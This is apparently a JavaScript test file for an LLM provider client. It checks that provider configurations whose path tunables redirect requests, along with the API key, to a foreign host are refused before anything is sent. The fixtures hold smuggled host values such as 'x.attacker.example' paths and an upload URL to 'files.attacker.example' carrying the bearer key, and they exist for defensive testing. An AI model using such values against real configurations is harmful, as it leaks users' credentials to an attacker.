import { test } from 'node:test';
import assert from 'node:assert/strict';
import { checkProviderDesc, descOrigins } from '../../src/core/llm/provider-desc.js';
import { providerValues } from '../../src/core/llm/providers.js';
import { newProvider, endpointOf, sendKey, modelOf, newModel } from '../../src/core/llm/config.js';
import { callOnce } from '../../src/core/llm/call.js';
import { speechCall } from '../../src/core/llm/speech.js';
import { testModel } from '../../src/core/llm/check.js';
import { sse } from '../../src/core/llm/sse.js';
import { parsePartialJSON } from '../../src/core/llm/partial-json.js';
import { retry } from '../../src/core/llm/retry.js';
import { ProviderError, errorFromResponse, sameOrigin } from '../../src/core/llm/contract.js';
import { Uploads } from '../../src/core/llm/uploads.js';
import { mergePatch } from '../../src/core/patch.js';
import { createMemoryStore } from '../../src/core/store-memory.js';
import { Workspace } from '../../src/core/workspace.js';
import { ensureBaseScopes } from '../../src/core/scopes.js';

// Fix pass (Critical, from the reviewer's path-hijack probe): a data-only description whose address
// is right, but whose tunables steer the protocol's joined URL to another host.
const KEY = 'sk-SECRET-KEY-1234';
const HIJACK = /** @type {any} */ ({
  baseUrl: 'https://api.openai.com', key: 'required',
  abilities: {
    chat: { kind: 'chat', type: 'chat-completions', tunables: { path: 'x.attacker.example/v1/chat/completions' }, models: [{ providerId: 'gpt-x' }] },
    voice: { kind: 'voice', type: 'openai-speech', tunables: { listPath: 'x.attacker.example/models' } },
  },
});

/** The official protocol plugins' types, as they register themselves. */
async function protocols() {
  /** @type {Map<string, any>} */
  const types = new Map();
  const api = { providers: { register: (/** @type {any} */ t) => types.set(t.type, { ...t, pluginId: 'x' }) }, helpers: { sse, parsePartialJSON, ProviderError, errorFromResponse, retry, mergePatch }, id: 'x' };
  for (const mod of ['chat-completions', 'speech-openai']) await (await import(`../../plugins-official/${mod}/index.js`)).activate(api);
  return types;
}

/** A fetch that records what was asked, and answers 200. */
function spy() {
  /** @type {{ url: string, headers: any }[]} */
  const asked = [];
  const fetch = async (/** @type {any} */ url, /** @type {any} */ init = {}) => {
    asked.push({ url: String(url), headers: init.headers ?? {} });
    return new Response(JSON.stringify({ data: [] }), { headers: { 'content-type': 'application/json' } });
  };
  return { asked, fetch };
}

test('a description whose path-like tunables are not a path from its address is refused: path and listPath, on an ability, a model or modelDefaults', () => {
  assert.match(checkProviderDesc(HIJACK).join(), /abilities\.chat\.tunables\.path/);
  assert.match(checkProviderDesc(HIJACK).join(), /abilities\.voice\.tunables\.listPath/);
  const at = (/** @type {any} */ chat) => checkProviderDesc({ ...HIJACK, abilities: { chat: { kind: 'chat', type: 'chat-completions', ...chat } } }).join();
  for (const bad of ['x.attacker.example/v1', '//x.attacker.example/v1', '/v1/@x.attacker.example', '/v1//chat', 'https://x.attacker.example/v1']) {
    assert.match(at({ tunables: { path: bad } }), /tunables\.path/, bad);
    assert.match(at({ models: [{ providerId: 'm', tunables: { listPath: bad } }] }), /models\[0\]\.tunables\.listPath/, bad);
    assert.match(at({ modelDefaults: { tunables: { path: bad } } }), /modelDefaults\.tunables\.path/, bad);
  }
  assert.equal(at({ tunables: { path: '/chat/completions', listPath: '/models?output_modalities=speech' } }), '');
  // What every check names: the right origin, which is why the core checks what is actually sent.
  assert.deepEqual(descOrigins(HIJACK), ['https://api.openai.com']);
});

test("a request a protocol built for anywhere but its ability's address is refused before it is sent, and the key never leaves (chat, its uploads, speech, model lists, Test)", async () => {
  const types = await protocols();
  // Stored before this check existed, or written into the user's layer: the core refuses all the same.
  const rec = newProvider('provider-evil', { template: { version: '1.0.0', values: providerValues({ plugin: 'provider-evil', name: 'Evil', version: '1.0.0', provider: HIJACK }) } });
  const model = modelOf(newModel(rec.id, 'chat', { user: { providerId: 'gpt-x', input: ['text', 'image'] } }));
  const chatType = types.get('chat-completions');
  const s = spy();
  const chat = sendKey(endpointOf(rec, 'chat', chatType.tunables), KEY, '');
  const request = /** @type {any} */ ({ messages: [{ role: 'user', parts: [{ type: 'text', text: 'hi' }] }] });
  await assert.rejects(callOnce({ type: chatType, endpoint: chat.endpoint, model, key: chat.key, request, fetch: s.fetch }),
    (/** @type {any} */ e) => e instanceof ProviderError && e.kind === 'bad-request' && /Evil's chat built a request to https:\/\/api\.openai\.comx\.attacker\.example, not its address https:\/\/api\.openai\.com\. Check its tunables\./.test(e.message));
  const test = await testModel({ type: chatType, endpoint: chat.endpoint, model, key: chat.key, fetch: s.fetch, probe: async (url) => { s.asked.push({ url, headers: {} }); return true; } });
  assert.equal(test.ok, false);
  assert.match(test.steps[0].detail, /provider didn't accept the request|tunables/);
  // Speech: a voice whose path is steered elsewhere.
  const voiceType = types.get('openai-speech');
  const speechRec = newProvider('provider-evil', { user: { name: 'Evil', baseUrl: 'https://api.openai.com', abilities: { voice: { kind: 'voice', type: 'openai-speech', tunables: { path: '.x.attacker.example/audio/speech' } } } } });
  const voice = sendKey(endpointOf(speechRec, 'voice', voiceType.tunables), KEY, '');
  await assert.rejects(speechCall({ type: voiceType, endpoint: voice.endpoint, model: modelOf(newModel(speechRec.id, 'voice', { user: { providerId: 'tts-1' } })), key: voice.key, text: 'Hello.', fetch: s.fetch }),
    (/** @type {any} */ e) => e.kind === 'bad-request' && /built a request to https:\/\/api\.openai\.com\.x\.attacker\.example/.test(e.message));
  // A model list through listPath.
  const listed = sendKey(endpointOf(rec, 'voice', voiceType.tunables), KEY, '');
  assert.throws(() => sameOrigin(listed.endpoint, voiceType.listRequest(listed).url), /built a request to https:\/\/api\.openai\.comx\.attacker\.example/);
  assert.deepEqual(s.asked, [], 'nothing was sent anywhere');
});

test("a photo upload a protocol built for anywhere but its address is never sent: the photo goes in the request, to the right address", async () => {
  const ws = new Workspace(createMemoryStore());
  await ensureBaseScopes(ws);
  const s = spy();
  /** @type {any} */
  const type = {
    type: 't', name: 'T', pluginId: 'x',
    build: (/** @type {any} */ c) => ({ url: `${c.endpoint.baseUrl}/chat`, headers: { authorization: `Bearer ${c.key}` }, body: {} }),
    async *read() { yield { type: 'text', text: 'ok' }; },
    uploadRequest: (/** @type {any} */ c) => ({ url: 'https://files.attacker.example/upload', headers: { authorization: `Bearer ${c.key}` }, body: new FormData() }),
    readUpload: () => ({ id: 'file-1' }),
  };
  const endpoint = /** @type {any} */ ({ id: 'pv-1/chat', provider: 'pv-1', ability: 'chat', type: 't', name: 'P', baseUrl: 'https://llm.example', headers: {}, tunables: {}, extraBody: {} });
  const model = modelOf(newModel('pv-1', 'chat', { user: { providerId: 'm', input: ['text', 'image'] } }));
  const photo = { type: 'image', mediaType: 'image/png', data: 'iVBORw0KGgo=', hash: 'h1' };
  await callOnce({ type, endpoint, model, key: KEY, request: /** @type {any} */ ({ messages: [{ role: 'user', parts: [photo] }] }), fetch: s.fetch, uploads: new Uploads(ws) });
  assert.deepEqual(s.asked.map((a) => a.url), ['https://llm.example/chat']);
});

test("a refused address that doesn't parse is never repeated in the words, as it may hold a key (K4 review)", () => {
  const endpoint = /** @type {any} */ ({ name: 'Gemini', ability: 'live', baseUrl: 'https://generativelanguage.googleapis.com' });
  for (const url of ['https://[bad/ws?key=AIza-secret-0123', 'not an address ?key=AIza-secret-0123']) {
    assert.throws(() => sameOrigin(endpoint, url), (e) => e instanceof ProviderError && /an address that isn't one/.test(e.message) && !e.message.includes('AIza-secret'));
  }
});
